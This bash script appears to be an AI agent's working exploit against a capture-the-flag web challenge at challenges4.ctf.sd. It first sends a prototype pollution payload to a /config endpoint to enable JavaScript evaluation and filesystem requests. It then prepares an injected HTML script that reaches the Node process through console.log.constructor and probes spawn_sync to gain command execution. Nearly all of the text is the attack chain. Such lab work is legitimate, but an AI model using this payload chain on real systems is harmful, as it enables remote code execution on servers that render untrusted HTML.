#!/bin/bash

# Function to pollute
pollute() {
  curl -s -X POST http://challenges4.ctf.sd:33184/config \
  -H 'Content-Type: application/json' \
  -d '{
      "myproto": "[Circular (__proto__)]",
      "myproto.settings.enableJavaScriptEvaluation": true,
      "myproto.settings.disableJavaScriptEvaluation": false,
      "myproto.settings.enableFileSystemHttpRequests": true,
      "myproto.settings.disableJavaScriptFileLoading": false
  }' > /dev/null
}

# Function to render
render() {
  PAYLOAD="$1"
  curl -s -X POST http://challenges4.ctf.sd:33184/render \
  -H 'Content-Type: application/json' \
  -d "{\"html\": \"$PAYLOAD\"}"
}

pollute

# Try to list keys of spawn_sync
SCRIPT="<script>
try {
  const proc = console.log.constructor('return process')();
  try {
     const spawn = proc.binding('spawn_sync');
     document.body.innerHTML = 'spawn_sync keys: ' + Object.keys(spawn).join(',');
  } catch(e) {
     document.body.innerHTML = 'spawn_sync error: ' + e.toString();
  }
} catch(e) { document.body.innerHTML = 'Global error: ' + e.toString(); }
</script>"

# Escape quotes for JSON
JSON_PAYLOAD=$(echo "$SCRIPT" | sed 's/"/\\"/g' | tr -d '\n')
#render "$JSON_PAYLOAD" # This payload logic is tricky in bash with nested quotes.

# Let's just use Python or Node to send the request?
# No, I used curl successfully. I just need to be careful with escaping.
# But I can use the tool run_in_terminal directly.
